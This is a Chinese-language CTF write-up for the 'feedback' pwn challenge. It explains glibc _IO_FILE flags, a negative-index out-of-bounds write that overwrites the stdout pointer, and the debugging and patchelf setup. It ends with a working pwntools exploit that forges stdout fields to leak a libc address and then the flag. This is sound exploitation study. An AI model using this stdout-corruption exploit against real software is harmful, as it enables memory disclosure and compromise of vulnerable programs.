# feedback

## 文件分析

下载`feedback`, 保护全开  
ghidra分析为64位程序

缓冲区没有溢出，所以没法利用栈溢出等，因为可以访问stdout等，故利用`_IO_FILE`  
本题是我第一次做`_IO_FILE`，详细写写

## 前置知识

`_IO_FILE`中存在`_flags`，各标志位含义如下

```c
/* Magic numbers and bits for the _flags field.
   The magic numbers use the high-order bits of _flags;
   the remaining bits are available for variable flags.
   Note: The magic numbers must all be negative if stdio
   emulation is desired. */
#define _IO_MAGIC 0xFBAD0000 /* Magic number */
#define _OLD_STDIO_MAGIC 0xFABC0000 /* Emulate old stdio. */
#define _IO_MAGIC_MASK 0xFFFF0000
#define _IO_USER_BUF 1 /* User owns buffer; don't delete it on close. */
#define _IO_UNBUFFERED 2
#define _IO_NO_READS 4 /* Reading not allowed */
#define _IO_NO_WRITES 8 /* Writing not allowd */
#define _IO_EOF_SEEN 0x10
#define _IO_ERR_SEEN 0x20
#define _IO_DELETE_DONT_CLOSE 0x40 /* Don't call close(_fileno) on cleanup. */
#define _IO_LINKED 0x80 /* Set if linked (using _chain) to streambuf::_list_all.*/
#define _IO_IN_BACKUP 0x100
#define _IO_LINE_BUF 0x200
#define _IO_TIED_PUT_GET 0x400 /* Set if put and get pointer logicly tied. */
#define _IO_CURRENTLY_PUTTING 0x800
#define _IO_IS_APPENDING 0x1000
#define _IO_IS_FILEBUF 0x2000
#define _IO_BAD_SEEN 0x4000
#define _IO_USER_LOCK 0x8000
```

pwn中常用0xfbad1800

puts, sprintf, printf等包装函数，最后都会调用write，可以对stdout结构体进行修改，
实现leak；其中结构体中的`_chain`，在stdout中会指向stdin；在执行包装输出函数前，
会打印`_IO_write_base`到`_IO_write_ptr`范围内的字符；初始化后`_IO_write_*`
会指向结构体中的`_shortbuf`，通过覆盖最后一个字节，可以将base指向`_chain`

## 踩过的坑

一开始在我本地上跑的时候，flag是无法写入的:
read函数返回-1(val of rax)，使用`p *__errno_location()`查询errno得知，
14: Bad Address，本身读入的地址就没有w权限

后来发现zip包里含有ld和libc，
可以patchelf（这里我把这两各文件放在./libs下）

> Arch Linux可以直接pacman(yay)安装patchelf哦

gdb中要重启程序不需要q，先kill再run/start即可

```shell
patchelf patchelf --set-interpreter ./libs/ld-2.31.so --replace-needed libc.so.6 ./libs/libc-2.31.so feedback
chmod +x ./libs/* # 一定要+x！不然没有权限执行
```

patch后gdb调试发现这时flag就会放到一个匿名内存段，不会崩溃了

## 逆向

反汇编后得知，flag放在比`puts`高0x16d2e0的地址，而`puts`的地址是随机化的，
因此可以获取libc中的任意地址然后偏移取得flag地址

在vuln函数中要输入数组索引，而索引被限定为小于4；观察.bss段布局可知，
stdout地址比`feedback_list`低，将索引输入为-8，就可以覆盖stdout写入

gdb调试后可以知道stdin与flag位置的差值

## EXPLOIT

```python
from pwn import *
sh = remote('localhost', 37325)

# payload 1
sh.sendline(b'-8') # locate stdout ptr
payload = p64(0xfbad1800) # _flags
payload += p64(0) # _IO_read_ptr，stdout不涉及输入，改成0就可以
payload += p64(0) # _IO_read_end
payload += p64(0) # _IO_read_base
payload += b'\x08' # _IO_write_base first byte, points to _chain
# write _chain (stdin) out
sh.sendlineafter(b'back.', payload)

flag = u64(sh.recvuntil(b'Your')[1:7]+b'\0\0') - 0x1980 + 0x6700 # get stdin addr and shift to flag addr

# payload 2
sh.sendline(b'-8') # locate stdout ptr
payload = payload[:-1] # remove '\x08'
payload += p64(flag) # _IO_write_base
payload += p64(flag + 0x30) # _IO_write_ptr, unknown flag length, assuming 48
# write flag out
sh.sendlineafter(b'back.', payload)
sh.interactive()
```

Done.
